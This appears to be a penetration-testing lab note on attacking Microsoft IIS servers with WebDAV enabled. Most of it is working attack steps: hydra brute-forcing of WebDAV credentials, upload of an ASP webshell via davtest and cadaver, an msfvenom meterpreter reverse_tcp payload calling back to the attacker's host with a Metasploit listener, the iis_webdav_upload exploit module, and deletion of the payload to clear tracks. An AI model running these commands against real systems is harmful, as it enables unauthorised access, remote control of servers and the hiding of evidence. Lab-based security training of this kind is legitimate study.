# 1 - Microsoft IIS WebDav

## **Microsoft IIS**

* IIS (Internet Information Services) is a proprietary extensible web server software developed by Microsoft for use with the Windows NT family.
* It can be used to host websites/web apps and provides administrators with a robust GUI for managing websites.
* IIS can be used to host both static and dynamic web pages developed in ASP.NET and PHP.
* Typically configured to run on ports 80/443.
* Supported executable files extensions:
  * .asp
  * .aspx
  * .config
  * .php

## **WebDAV**

* WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.
* WebDAV essentially enables a web server to function as a file server for collaborative authoring.
* WebDAV runs on top of Apache(Linux) or Microsoft IIS(Windows) on ports 80/443.
* In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.

## **WebDAV Exploitation**

* The first step of the exploitation process will involve identifying whether WebDAV has been configured to run on the IIS web server.
* We can perform a brute-force attack on the WebDAV server in order to identify legitimate credentials that we can use for authentication.
* After obtaining legitimate credentials, we can authenticate with the WebDAV server and upload a malicious .asp payload that can be used to execute arbitrary commands or obtain a reverse shell on the target.

## **Tools**

* **davtest** - Used to scan, authenticate and exploit a WebDAV server. Giving us information as to what kind of files we can upload and execute on the WebDav server.
  * Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.
* **cadaver** - cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creations and deletion, property manipulation, and resource locking on WebDav servers.
  * &#x20;Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.



## **Practical Demonstration**

## Manually

**1 - We do an nmap scan to identify service versions on the host.**

* `nmap -sV -sC $ip` - scan the host.
* `nmap -sV -p 80 --script=http-enum 192.168.0.141` - indepth scan on port 80. This returns a "/webdav/" directory with a (401 Unauthorised) meaning WebDav is configured and Authentication is allowed.
* `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.29.107 http-get /webdav/` -  Bruteforce WebDAV authentication.

**2 -** **We can proceed with the credentials and use the \[davtest] tool to check what kind of files we can upload and execute in the WebDav server.**

`davtest -url http://$ip` -  if there's no authentication required.

`davtest -auth bob:password_123321 -url http://$ip` -  in this case we provide auth details, and found that we can upload ".txt, .html and .asp" files.

**3 - We can now use the \[cadaver] utility to upload a malicious ".asp" file to the WebDav server.**

`cadaver http://$ip/webdav` - provides us with a psuedo shell that allows us interact with the WebDav server. \[ls] to list files.

4 - Upload a webshell file to the server. `put /usr/share/webshells/asp/webshell.asp` .

5 - load the page, then execute the payload file.

### Cmds you can run in the WebDev shell

```bash
whoami
ipconfig
dir C:\  # list the content of the C drive root.
type C:\flag.txt  # output the content of the flag.
```



## Exploiting WebDAV With Metasploit

### Practical Demonstration

### Exploiting Manually with \[msfvenom] utility:&#x20;

```bash
# step 1
# generating .asp payload with msfvenom.
# its better to use the 32bit architecture for the payload if you are not sure whether the target is 32bit or 64bit.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$kali_Ip LPORT=1234 -f asp > shell.asp

# step 2
# use cadaver to upload the file.
cadaver http://$ip
put /path_to_payload # example /root/shell.asp

# step 3
# setup a listener to catch the reverse shell connection.
# you can use [nc] or [msf multi-handler]
sevice postgresql start && msfconsole  # here we use the Metasploit
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $kali_ip
set LPORT 1234
run  # this will startup our reverse_tcp listener

# step 4
# execute/click the payload (shell.asp) file from the web browser
# we get a metepreter shell.
sysinfo
getuid

# after successful exploitation, you can delete the payload to clear tracks.
# using the cadaver utility.
delete shell.asp
```

### Exploiting Automatically with Metasploit

```bash
# step 1
search iis upload  # in metasploit.
use exploit/windows/iis/iis_webdav_upload.asp
# you can leave the default 32bit reverse_tcp payload.
show options
# since this process automates everything, we have to provide the WebDav credentials.
set HTTPUsername bob
set HTTPPassword password_123321
set RHOSTS $ip
# you can set the RPORT value to 443, and SSL to true if the WebDav server has an SSL certificate available.
# set the path to which  the file will be uploaded, give the payload a name (metasploit.asp).
set PATH /webdav/metasploit.asp
exploit
# we get a meterpreter shell!
```



